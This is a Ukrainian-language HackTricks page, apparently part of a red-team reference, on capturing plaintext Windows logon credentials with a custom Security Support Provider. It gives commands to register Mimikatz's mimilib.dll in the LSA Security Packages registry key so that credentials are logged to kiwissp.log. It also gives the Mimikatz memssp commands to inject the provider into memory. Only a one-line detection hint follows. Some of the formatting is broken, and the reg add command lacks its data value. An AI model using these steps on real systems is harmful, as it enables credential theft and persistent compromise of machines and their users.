# Custom SSP

<details>

<summary><strong>Вивчайте хакінг AWS від нуля до героя з</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Інші способи підтримки HackTricks:

* Якщо ви хочете побачити **рекламу вашої компанії на HackTricks** або **завантажити HackTricks у форматі PDF**, перевірте [**ПЛАНИ ПІДПИСКИ**](https://github.com/sponsors/carlospolop)!
* Отримайте [**офіційний PEASS & HackTricks мерч**](https://peass.creator-spring.com)
* Відкрийте для себе [**Сім'ю PEASS**](https://opensea.io/collection/the-peass-family), нашу колекцію ексклюзивних [**NFT**](https://opensea.io/collection/the-peass-family)
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Поділіться своїми хакерськими трюками, надсилайте PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) **і** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **репозиторіїв на GitHub**.

</details>

### Власний SSP

[Дізнайтеся, що таке SSP (Постачальник підтримки безпеки) тут.](../authentication-credentials-uac-and-efs/#security-support-provider-interface-sspi)\
Ви можете створити **власний SSP**, щоб **захопити** в **чистому тексті** облікові **дані**, які використовуються для доступу до машини.

#### Mimilib

Ви можете використовувати бінарний файл `mimilib.dll`, наданий Mimikatz. **Це буде реєструвати всі облікові дані в чистому тексті всередині файлу.**\
Розмістіть dll у `C:\Windows\System32\`\
Отримайте список існуючих пакунків безпеки LSA:

{% code title="attacker@target" %}
```
```
{% endcode %}

\`\`\`bash PS C:\\> reg query hklm\system\currentcontrolset\control\lsa\ /v "Security Packages"

HKEY\_LOCAL\_MACHINE\system\currentcontrolset\control\lsa Security Packages REG\_MULTI\_SZ kerberos\0msv1\_0\0schannel\0wdigest\0tspkg\0pku2u

````
Додайте `mimilib.dll` до списку постачальників безпеки (Security Packages):
```powershell
reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
````

І після перезавантаження всі облікові дані можна знайти у відкритому вигляді в `C:\Windows\System32\kiwissp.log`

#### У пам'яті

Ви також можете впровадити це безпосередньо у пам'ять за допомогою Mimikatz (зверніть увагу, що це може бути трохи нестабільним/не працювати):

```powershell
privilege::debug
misc::memssp
```

Це не виживе перезавантажень.

#### Заходи запобігання

Подія ID 4657 - Аудит створення/зміни `HKLM:\System\CurrentControlSet\Control\Lsa\SecurityPackages`
